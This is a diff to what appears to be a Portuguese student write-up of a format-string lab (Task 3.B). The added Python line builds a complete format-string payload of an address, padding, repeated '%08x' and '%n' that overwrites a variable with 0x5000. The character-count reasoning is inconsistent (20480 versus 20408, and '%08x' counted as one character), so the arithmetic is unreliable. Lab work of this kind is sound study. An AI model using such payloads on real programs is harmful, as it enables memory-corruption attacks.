@@ -110,13 +110,15 @@ O output do lado do servidor foi o seguinte:
 
 ### Task 3.B
 
-Desta vez o valor de `target` deve ser mudado para um valor concreto: 0x5000, ou 20480 em decimal. Como sabemos que '%n' irá colocar, então o input terá de ter 20408 caracteres.
+Desta vez o valor de `target` deve ser mudado para um valor concreto: 0x5000, ou seja 20480 em decimal. Como sabemos que '%n' irá escrever o número de caracteres escritos até ali, então o input até '%n' terá de ter 20408 caracteres.
 
-Para simplificar a tarefa, usamos um programa em Python:
+Para simplificar a tarefa, usamos um programa em Python para criar o input:
 
 ```python
-string = "\x08\x0e\x50\x68" + "F"* x + "%08x" * 63 + "%n"
-print(string)
+# '\x08\x0e\x50\x68' > 4 caracteres
+# '%08x'             > 1 caracter
+# a string restante terá 20408 - 4 - 63 = 20341 caracteres
+print("\x08\x0e\x50\x68" + "F" * 20341 + "%08x" * 63 + "%n")
 ```
 
 ```bash
